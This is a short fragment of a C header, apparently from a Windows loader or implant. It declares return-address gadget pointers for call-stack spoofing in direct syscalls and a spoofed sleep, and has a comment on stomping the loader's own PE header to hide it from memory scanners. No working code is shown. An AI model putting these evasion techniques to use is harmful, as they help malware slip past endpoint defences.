...
// Spoof-frame ret gadgets used by dosyscall.S
// 2-frame (DoSyscall):     frame1=ntdll, frame2=KernelBase
// 4-frame (DoSleepSpoof):  frame1=ntdll, frame3=ntdll, frame4=ntdll, frame2=KernelBase
extern PVOID g_spoof_frame1;
extern PVOID g_spoof_frame2;
extern PVOID g_spoof_frame3;
extern PVOID g_spoof_frame4;
...
// Timing (Fix #8 — 4-frame spoofed sleep, Fix #9 — waitable)
...
// Fix #7 — stomp own PE header to hide loader from memory scanners
